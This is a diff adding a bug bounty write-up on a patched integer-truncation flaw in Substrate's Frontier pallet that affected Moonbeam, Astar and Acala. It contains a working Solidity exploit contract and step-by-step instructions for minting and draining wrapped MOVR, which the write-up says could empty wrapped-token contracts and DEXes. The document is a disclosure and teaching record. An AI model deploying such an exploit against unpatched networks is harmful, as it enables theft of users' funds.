@@ -259,11 +259,103 @@ Bounty: $400,000
 
 Reported by: @pwning.eth
 
-Protocol: Moonbeam
+Protocol: Moonbeam, Astar Network, and Acala
 
 Date: June 27th, 2023
 
 Bounty: $1,000,000
+
+### TL;DR
+
+In the Frontier pallet for Substrate, there's a vulnerability due to the truncation of `msg.value` from 256 bits to 128 bits in the `transfer` function. This causes smart contracts to mistakenly accept large values as valid when they are actually truncated to zero. An attacker can exploit this by creating and withdrawing from wrapper tokens as if they had deposited a large amount of value, leading to the potential draining of all wrapped tokens on the network. This can also affect DEXes by allowing attackers to drain tokens from them as well.
+
+### Vulnerability Analysis
+
+The bug, which was found within Frontier — the Substrate pallet that provides core Ethereum compatibility features within the Polkadot ecosystem–impacted Moonbeam, Astar Network, and Acala.
+
+On Moonbeam, we have native tokens like `MOVR` and `GLMR` and their wrapped counterparts, like `WMOVR` and `WGLRM`. Likewise, on Astar, there is `Astar` and `Wrapped Astar`.
+
+The central issue was with how Frontier handled low-level EVM events:
+
+```rust
+	fn transfer(&mut self, transfer: Transfer) -> Result<(), ExitError> {
+		let source = T::AddressMapping::into_account_id(transfer.source);
+		let target = T::AddressMapping::into_account_id(transfer.target);
+
+		T::Currency::transfer(
+			&source,
+			&target,
+@>			transfer.value.low_u128().unique_saturated_into(),
+			ExistenceRequirement::AllowDeath,
+		)
+		.map_err(|_| ExitError::OutOfFund)
+	}
+```
+
+In the above code snippet, we notice in `transfer` that the `msg.value` is reduced (or truncated) from 256 bits to 128 bits. This seemingly innocuous oversight might result in a serious discrepancy between the runtime and the EVM environment.
+
+What is truncation? In simplest terms, truncation means to cut off a portion of the number. If we do decimal truncation of 9.8, we would cut off 0.8 and we would be left with 9. In bit truncation, we truncate the higher bits of a number. For example, truncating a 32 bit number to 16 bits would result in higher-end bits being cut off and only the lower 16 bits staying.
+
+65539 (32 bit) to 16 bit would result in the number 3. Why?
+
+65539 is 10000000000000011 in binary. As it only takes 17 bits to hold that number, we only leave with the lower 16 bits (counting from right), and we are left with 0000000000000011, which is 3.
+
+What does this all mean in the context of the bug? Smart contracts believe that the huge 256 bit `msg.value` is valid, although the actual transfer never happens, as the truncated value will be zero, even though we passed in `msg.value` `2¹²⁸`.
+
+In reality, we won’t be transferring any native tokens, due to this error. However, smart contracts that accept `msg.value` as though it were in 256 bit format (wrapper contracts, for example), will think we transferred `2¹²⁸`!
+
+With this trick, we could create as many wrapper tokens as we wanted to and later withdraw everything from wrapper contracts. This would drain every wrapped token on the network.
+
+But that’s not all. With DEXes accepting native transfer of tokens to swap to any other token, we could also drain all DEXes on such a network.
+
+To illustrate the above, here is a sample contract to exploit the bug:
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.8.0;
+
+interface IWETH {
+    function deposit() external payable;
+    function withdraw(uint wad) external;
+}
+
+contract Exploit {
+    IWMOVR private wmovr;
+
+    constructor(address _wmovr) {
+        wmovr = IWMOVR(_wmovr);
+    }
+
+    function depositWMOVR() payable external {
+        uint256 val = msg.value + (1 << 128);
+        wmovr.deposit{value: val}();
+    }
+
+    function withdrawMOVR(uint256 amount) external {
+        wmovr.withdraw(amount);
+    }
+
+    function balance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+    fallback() external payable {}
+}
+```
+
+A step-by-step guide for understanding how the exploit works practically:
+
+1. Deploy the above exploit contract onto the Moonbeam network with the address of the Wrapped MOVR contract.
+2. Call `depositWMOVR()` function with `msg.value=0`. The `val` will be evaluated into `2¹²⁸ + 0`. This will mean that during the deposit into `WMOVR`, we won’t be transferring any `MOVR` as it will be truncated to `0`.
+3. Call `withdrawMOVR()`. The `WMOVR` contract will think we deposited `2¹²⁸` in the previous step thus allowing us to get `2¹²⁸` `MOVR` by only paying for the transaction fees!
+4. Profit.
+
+### Vulnerability Fix
+
+Moonbeam released a new Runtime 1606 which addressed the issue by removing the truncation. More information about the fix can be found [here](https://moonbeam.network/news/moonbeam-team-releases-urgent-security-patch-for-integer-truncation-bug) in their security announcement.
+
+As Moonbeam is also one of the maintainers of the library, they released a [bug fix](https://github.com/moonbeam-foundation/frontier/compare/652abf16...ca027df5).
 
 ## References
 
